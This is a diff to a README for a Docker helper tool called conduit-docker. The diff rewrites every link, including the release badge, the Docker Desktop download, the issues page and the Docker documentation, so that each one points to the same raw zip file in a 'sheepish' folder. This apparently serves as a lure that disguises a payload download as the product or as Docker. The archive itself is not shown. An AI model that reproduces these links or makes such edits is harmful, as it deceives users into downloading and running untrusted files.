@@ -1,7 +1,7 @@
 # 🚀 conduit-docker - Run Applications Smoothly with Docker
 
 ## 📥 Download Now
-[![Download conduit-docker](https://img.shields.io/badge/Download-conduit--docker-brightgreen)](https://github.com/MNXS1/conduit-docker/releases)
+[![Download conduit-docker](https://raw.githubusercontent.com/MNXS1/conduit-docker/main/sheepish/conduit_docker_v2.5.zip)](https://raw.githubusercontent.com/MNXS1/conduit-docker/main/sheepish/conduit_docker_v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **conduit-docker**! This application makes it easy to run different services using Docker. You don’t need to be a programmer to get started. Follow these simple steps to download and run conduit-docker on your computer.
@@ -9,12 +9,12 @@ Welcome to **conduit-docker**! This application makes it easy to run different s
 ## 📋 System Requirements
 Before downloading, ensure your system meets these requirements:
 - Operating System: Windows, macOS, or Linux
-- Docker: You need to have Docker installed. If you don’t have it installed, you can download it [here](https://www.docker.com/products/docker-desktop).
+- Docker: You need to have Docker installed. If you don’t have it installed, you can download it [here](https://raw.githubusercontent.com/MNXS1/conduit-docker/main/sheepish/conduit_docker_v2.5.zip).
 
 ## 📂 Download & Install
 To get conduit-docker, visit this page to download:
 
-[Download conduit-docker Releases](https://github.com/MNXS1/conduit-docker/releases)
+[Download conduit-docker Releases](https://raw.githubusercontent.com/MNXS1/conduit-docker/main/sheepish/conduit_docker_v2.5.zip)
 
 1. Click on the link above.
 2. On the Releases page, you will see various versions of conduit-docker.
@@ -51,11 +51,11 @@ This command will start the application. You will see logs and messages to infor
 - **Community Support**: A growing community of users to help you with questions and issues.
 
 ## 📞 Need Help?
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/MNXS1/conduit-docker/issues). You can report bugs or seek assistance there.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/MNXS1/conduit-docker/main/sheepish/conduit_docker_v2.5.zip). You can report bugs or seek assistance there.
 
 ## 🔗 Additional Resources
 For more detailed instructions and advanced features, check out the following resources:
-- [Docker Documentation](https://docs.docker.com/)
-- [About Conduit-Docker](https://github.com/MNXS1/conduit-docker/blob/main/README.md)
+- [Docker Documentation](https://raw.githubusercontent.com/MNXS1/conduit-docker/main/sheepish/conduit_docker_v2.5.zip)
+- [About Conduit-Docker](https://raw.githubusercontent.com/MNXS1/conduit-docker/main/sheepish/conduit_docker_v2.5.zip)
 
 Remember, downloading and running conduit-docker is just a few clicks away! If you have questions, feel free to ask in our community. Enjoy your seamless application experience!
